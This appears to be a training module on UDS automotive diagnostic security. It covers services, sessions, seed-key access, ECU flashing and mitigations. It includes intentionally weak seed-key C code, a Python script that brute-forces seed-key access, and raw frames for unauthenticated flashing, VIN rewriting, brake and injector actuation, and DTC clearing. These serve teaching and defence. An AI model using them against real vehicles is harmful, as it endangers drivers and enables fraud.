# Module 06 — UDS & Diagnostic Security

> Level: Intermediate | Est. study time: 8 hours

---

## 6.1 UDS Service Reference

UDS (ISO 14229-1) defines a standard set of diagnostic services:

```
SESSION SERVICES:
  0x10  DiagnosticSessionControl (DSC)
  0x11  ECUReset
  0x3E  TesterPresent

DATA SERVICES:
  0x22  ReadDataByIdentifier (RDBI)
  0x2E  WriteDataByIdentifier (WDBI)
  0x24  ReadScalingDataByIdentifier
  0x2C  DynamicallyDefineDataIdentifier

DTC SERVICES:
  0x14  ClearDiagnosticInformation
  0x19  ReadDTCInformation

INPUT/OUTPUT CONTROL:
  0x2F  InputOutputControlByIdentifier (IOCBI)

ROUTINE CONTROL:
  0x31  RoutineControl (RC)

UPLOAD/DOWNLOAD:
  0x34  RequestDownload
  0x35  RequestUpload
  0x36  TransferData
  0x37  RequestTransferExit
  0x38  RequestFileTransfer

SECURITY:
  0x27  SecurityAccess
  0x29  Authentication (ISO 14229-1:2020)

COMMUNICATION CONTROL:
  0x28  CommunicationControl

FAULT MEMORY:
  0x85  ControlDTCSetting
```

---

## 6.2 Session Types

```
DEFAULT SESSION (0x01):
  - Always accessible, no security
  - Read DTCs (0x19), TesterPresent (0x3E)
  - Read basic DIDs (VIN, ECU ID)
  - Cannot write data or flash

EXTENDED DIAGNOSTIC SESSION (0x03):
  - Requires SecurityAccess Level 0x01/0x02
  - Read/write DIDs
  - IO control (actuator activation)
  - Clear DTCs
  - Routine control (non-critical)

PROGRAMMING SESSION (0x02):
  - Requires SecurityAccess Level 0x11/0x12 (higher level)
  - ECU memory erase
  - Firmware download (0x34/0x36/0x37)
  - Post-programming check
  - Anti-rollback verification

SESSION TRANSITION DIAGRAM:
  DEFAULT ──(0x10 01)──► DEFAULT
  DEFAULT ──(0x10 03)──► EXTENDED ──(Security Access)──► EXTENDED_UNLOCKED
  DEFAULT ──(0x10 02)──► PROGRAMMING ──(Security Access)──► PROG_UNLOCKED
  
  Any session ──(0x11 01)──► DEFAULT (ECU Reset)
  Timeout (default P3 = 5s without TesterPresent) ──► DEFAULT
```

---

## 6.3 Security Access (0x27) — Seed-Key Algorithm

```
SEED-KEY FLOW:

  Tester                               ECU
    │── 0x27 0x01 ────────────────────►│  RequestSeed (odd subfunction)
    │◄─ 0x67 0x01 [SEED: A3 B5 C7 D9]─│  Seed response
    │                                  │
    │  [Compute: KEY = f(SEED)]        │  (same algorithm both sides)
    │                                  │
    │── 0x27 0x02 [KEY: E1 F3 45 67] ─►│  SendKey (even subfunction)
    │◄─ 0x67 0x02 (Access Granted) ───│  Positive response
    OR
    │◄─ 0x7F 0x27 0x35 (NRC: Invalid) │  Wrong key (NRC 0x35)
    │◄─ 0x7F 0x27 0x36 (NRC: Exceeded)│  Too many attempts (NRC 0x36)

Security Access Levels:
  0x01/0x02:  Extended session (configuration, IO control)
  0x11/0x12:  Programming session (ECU flashing)
  0x13/0x14:  Development/factory access (should be disabled in production)
  
NRC Codes for 0x27:
  0x22  conditionsNotCorrect   (wrong session, or engine running)
  0x24  requestSequenceError   (SendKey without prior RequestSeed)
  0x35  invalidKey             (computed key doesn't match)
  0x36  exceededNumberOfAttempts (lockout)
  0x37  requiredTimeDelayNotExpired (delay before retry)
```

---

## 6.4 Seed-Key Security

### Common Seed-Key Algorithm Vulnerabilities

```c
/* WEAK: Static seed (never changes) */
uint32_t generate_seed_WEAK(void) {
    return 0xDEADBEEF;  // Always same seed → key always same → trivially bypassed
}

/* WEAK: Seed derived from known values */
uint32_t generate_seed_WEAK2(void) {
    return (uint32_t)system_time_ms;  // Predictable → brute-forceable
}

/* WEAK: Simple XOR algorithm (reversible) */
uint32_t compute_key_WEAK(uint32_t seed) {
    return seed ^ 0xCAFEBABE;  // XOR with constant → extractable from binary
}

/* WEAK: Hardcoded in binary (extractable via Ghidra/IDA) */
const uint32_t SECRET_CONSTANT = 0xCAFEBABE;  // In .rodata → easily found

/* STRONG: Cryptographically secure seed */
uint32_t generate_seed_SECURE(void) {
    uint32_t seed;
    HSM_GetRandomNumber((uint8_t*)&seed, 4);  // True hardware RNG
    return seed;
}

/* STRONG: HMAC-based key derivation */
void compute_key_SECURE(const uint8_t *seed, uint8_t *key, size_t keylen) {
    /* Secret is stored in HSM, never exported */
    HSM_HMAC_SHA256(
        HSM_KEY_HANDLE_UDS_AUTH,  // Key handle, not raw key
        seed, 4,                  // Input: seed
        key, keylen               // Output: HMAC (truncated to keylen)
    );
}
```

### Attack: Brute Force Seed-Key

```python
"""
Attack: Brute force simple XOR seed-key
Educational — demonstrates why simple algorithms are insufficient
"""
import udsoncan
from udsoncan.client import Client

def brute_force_xor_key(seed: bytes) -> bytes | None:
    """Try all single-byte XOR constants"""
    seed_int = int.from_bytes(seed, 'big')
    for xor_const in range(0x00000000, 0xFFFFFFFF, 0x01000000):
        candidate_key = seed_int ^ xor_const
        if verify_key_works(candidate_key.to_bytes(4, 'big')):
            return candidate_key.to_bytes(4, 'big')
    return None

def attack_security_access(client: Client, level: int = 1):
    """
    Attempt to identify seed-key pattern
    Monitor: NRC 0x36 (exceeded attempts) → wait 10s and retry
    """
    # Request seed
    response = client.request_seed(level)
    seed = response.service_data.security_seed
    print(f"Received seed: {seed.hex()}")
    
    # Try common patterns
    patterns = [
        lambda s: bytes(b ^ 0xFF for b in s),          # XOR with 0xFF
        lambda s: s[::-1],                              # Byte reversal
        lambda s: bytes(b ^ 0xCA for b in s),          # XOR constant
        lambda s: int.to_bytes(int.from_bytes(s,'big') + 1, len(s), 'big'),  # +1
    ]
    
    for i, pattern in enumerate(patterns):
        candidate_key = pattern(seed)
        try:
            client.send_key(level, candidate_key)
            print(f"[!] Pattern {i} WORKED! Key: {candidate_key.hex()}")
            return candidate_key
        except udsoncan.exceptions.NegativeResponseException as e:
            if e.response.code == 0x36:  # Exceeded attempts
                print("Lockout hit, waiting 10s...")
                time.sleep(10)
    
    return None
```

---

## 6.5 Real UDS Packet Examples

### Read VIN (0x22 0xF190)

```
REQUEST:  22 F1 90
         │  │  │
         │  └──┴── DID: 0xF190 (VIN DataIdentifier — standardized)
         └── Service: ReadDataByIdentifier

RESPONSE: 62 F1 90 57 30 4C 53 34 39 38 42 35 32 36 4E 36 30 30 30 30 30
          │  │  │  └───────────────────────────────────────────────────┘
          │  │  │   VIN ASCII: "W0LS498B526N600000"
          │  └──┴── DID echo: 0xF190
          └── Response SID: 0x62 (0x22 + 0x40)

NEGATIVE: 7F 22 31
          │  │  └── NRC: 0x31 (requestOutOfRange — DID not available in this session)
          │  └── Service: 0x22
          └── NRC header
```

### Flash ECU (Full Sequence)

```
# 1. Enter Extended Session
>> 10 03
<< 50 03 00 32 01 F4  (P2=50ms, P2*=500ms)

# 2. Security Access - Request Seed (Level 11 = Programming)
>> 27 11
<< 67 11 A3 B5 C7 D9  (seed = 0xA3B5C7D9)

# 3. Security Access - Send Key
>> 27 12 E1 F3 45 67  (key computed from seed)
<< 67 12              (access granted)

# 4. Enter Programming Session
>> 10 02
<< 50 02 00 32 01 F4

# 5. Erase Memory (Routine 0xFF00)
>> 31 01 FF 00 00 00 00 00 00 08 00  (erase address+length)
<< 71 01 FF 00 00                    (routine accepted)

# 6. Request Download
>> 34 00 44 00 00 00 00 00 08 00 00
   │  │  │  └─────────────────────── address: 0x00000000, length: 0x00080000
   │  │  └── length and address format identifier
   │  └── compression/encryption method: none
   └── Service: 0x34
<< 74 20 04 00  (max block size = 0x0400 = 1024 bytes)

# 7. Transfer Data (repeat for each block)
>> 36 01 <1024 bytes of encrypted firmware block 1>
<< 76 01

>> 36 02 <1024 bytes of encrypted firmware block 2>
<< 76 02
... (repeat for all blocks)

# 8. Request Transfer Exit
>> 37
<< 77

# 9. Verify signature (Routine 0x0202)
>> 31 01 02 02 <ECDSA signature 64 bytes>
<< 71 01 02 02 00  (0x00 = signature verified OK)

# 10. Reset
>> 11 01
<< 51 01
(ECU resets, Secure Boot validates new firmware)
```

---

## 6.6 Diagnostic Security Attacks

### Attack 1: Session Upgrade Without Authentication

```
Vulnerability: ECU allows programming session without Security Access
Attack:
  >> 10 02     (jump to programming session directly)
  << 50 02     (SUCCESS — no auth required!)
  >> 34 ...    (start firmware download — ECU accepts)
  
Mitigation: Programming session MUST require Security Access Level 2
```

### Attack 2: Unauthorized DID Write

```
Vulnerability: WriteDataByIdentifier (0x2E) allowed in default session
Attack:
  >> 2E F1 90 46 61 6B 65 56 49 4E 31 32 33 34 35 36 37 38  (write VIN)
  << 6E F1 90  (SUCCESS — VIN changed!)
  
Mitigation: 0x2E only in Extended Session + Security Access
```

### Attack 3: IO Control Abuse (0x2F)

```
Vulnerability: InputOutputControlByIdentifier allowed without auth
Attack:
  >> 2F 30 01 03 FF  (control horn actuator — full activation)
  → Unexpected horn activation (annoyance)
  
More dangerous:
  >> 2F 31 00 03 FF  (control fuel injector)
  >> 2F 28 04 03 FF  (control brake actuator on some systems)
  
Mitigation: 0x2F only in Extended Session + Security Access + speed limit check
```

### Attack 4: DTC Clearing (Evidence Destruction)

```
Attack: Attacker injects malicious CAN frames, ECU sets DTCs
        Attacker then clears DTCs to hide evidence:
  >> 14 FF FF FF  (clear ALL DTCs)
  << 54           (cleared)
  
Mitigation: 
  1. DTC clearing requires Security Access Level 1
  2. Maintain secure DTC event log in tamper-proof NVM
  3. Off-vehicle DTC backup via TCU to cloud
```

---

## 6.7 UDS Rate Limiting & Lockout

```c
/* AUTOSAR: DCM module lockout configuration */
/* After 3 wrong keys → 10 second delay before retry */

/* Dlt Dcm Security Access lockout configuration */
typedef struct {
    uint8_t  maxAttempts;        // = 3
    uint32_t delayMs;            // = 10000 (10 seconds)
    uint8_t  attemptCounter;     // runtime counter
    uint32_t lockoutTimestamp;   // timestamp of last failure
} SecurityAccessLockout_t;

DcmDsp_SecurityAccess_Level1 {
    DcmDspSecurityLevel = 0x01;
    DcmDspSecuritySeedSize = 4;
    DcmDspSecurityKeySize = 4;
    DcmDspSecurityADRSize = 0;
    DcmDspSecurityNumAttDelay = 3;       // max failed attempts
    DcmDspSecurityDelayTime = 10000;     // 10s lockout
    DcmDspSecurityDelayTimeOnBoot = 0;   // no delay at startup
}
```

---

## 6.8 Summary — Module 06

```
KEY TAKEAWAYS:

✓ UDS has no transport-level encryption — all diagnostic data is plaintext on CAN
✓ Programming session MUST require Security Access Level 2 (0x11/0x12)
✓ Seed-key algorithm strength is everything — must use HSM-backed HMAC
✓ Static seeds or simple XOR = completely broken
✓ Lockout after 3 failed attempts is mandatory (NRC 0x36)
✓ 0x2F (IO control) is the most dangerous service — restrict aggressively
✓ DTC clearing without authentication allows evidence destruction
✓ DoIP removes CAN transport but adds TCP/IP attack surface — TLS required
✓ Anti-rollback MUST be verified in the signature check routine (0x31)
```

**Next Module**: [07 — Ethernet & ADAS Security](07_ethernet_adas_security.md)
